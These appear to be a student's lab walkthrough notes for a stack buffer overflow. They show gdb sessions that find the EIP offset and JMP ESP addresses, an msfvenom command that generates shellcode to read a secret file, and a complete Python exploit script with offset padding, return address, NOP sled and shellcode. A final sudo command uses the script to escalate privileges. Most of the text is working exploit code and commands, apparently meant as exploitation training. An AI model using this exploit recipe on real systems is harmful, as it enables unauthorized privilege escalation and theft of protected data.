```
student@lin-ops:~/Desktop/Security$ gdb ./inventory.exe 
gdb-peda$ run
Starting program: /home/student/Desktop/Security/inventory.exe 
Press enter to view inventory: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```
(get this from wiremask.eu)
`EIP: 0x63413563 ('c5Ac')`
copy this value into wiremask.eu to get the offset
on comrade create a python script in tmp directory
```
comrade@web:/.hidden$ env - gdb ./inventory.exe 
(gdb) show env
LINES=14
COLUMNS=90
(gdb) unset env COLUMNS
(gdb) unset env LINES
(gdb) show env
(gdb) run 
Starting program: /.hidden/inventory.exe 
Press enter to view inventory: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
(gdb) find /b 0xf7def000, 0xffffe000, 0xff, 0xe4
```
copy the first 3 into note on your script
return to lip ops to run msfvenom
```
student@lin-ops:~/Desktop/Security$ msfvenom -p linux/x86/exec CMD="cat /.secret/.verysecret.pdb" -b '\x00' -f python
...
buf += b"\xda\xd2\xb8\x9e\xbf\x5e\xf6\xd9\x74\x24\xf4\x5e"
buf += b"\x2b\xc9\xb1\x11\x31\x46\x17\x03\x46\x17\x83\x58"
buf += b"\xbb\xbc\x03\x0e\xcf\x18\x75\x9c\xa9\xf0\xa8\x43"
buf += b"\xbf\xe6\xdb\xac\xcc\x80\x1b\xda\x1d\x33\x75\x74"
buf += b"\xeb\x50\xd7\x60\xf6\x96\xd8\x70\x6a\xf6\xac\x50"
buf += b"\x43\xd6\x3f\xf5\xf8\x54\xa5\x81\xd1\xb6\x53\x0c"
buf += b"\x5c\xbe\xe8\xab\xc3\x32\x6a\x47\x2a\xc3\x10\xc5"
buf += b"\x32\x74\x8a\x80\xd2\xb7\xac"
```
copy these values into the script
create a script with similar inputs:
```
#!/usr/bin/python2.7



#OFFSET

buf = "A" * 76 #OFFSET
'''
memory address fro jmp esp (convert from little ind -> big
0xf7df1b51
0xf7f6674b
0xf7f72753
'''
buf += "\x51\x1b\xdf\xf7" #EIP register - JMP ESP
#msfvenom -p linux/x86/exec CMD=ifconfig -b '\x00' -f python
buf += "\x90" * 10 #NOP sled 
buf += b"\xda\xd2\xb8\x9e\xbf\x5e\xf6\xd9\x74\x24\xf4\x5e"
buf += b"\x2b\xc9\xb1\x11\x31\x46\x17\x03\x46\x17\x83\x58"
buf += b"\xbb\xbc\x03\x0e\xcf\x18\x75\x9c\xa9\xf0\xa8\x43"
buf += b"\xbf\xe6\xdb\xac\xcc\x80\x1b\xda\x1d\x33\x75\x74"
buf += b"\xeb\x50\xd7\x60\xf6\x96\xd8\x70\x6a\xf6\xac\x50"
buf += b"\x43\xd6\x3f\xf5\xf8\x54\xa5\x81\xd1\xb6\x53\x0c"
buf += b"\x5c\xbe\xe8\xab\xc3\x32\x6a\x47\x2a\xc3\x10\xc5"
buf += b"\x32\x74\x8a\x80\xd2\xb7\xac"

print(buf)
```
this command is your last step to escalate your privledges
`comrade@web:/$ sudo /.hidden/inventory.exe <<< $(python /tmp/mybuff.py)`

https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
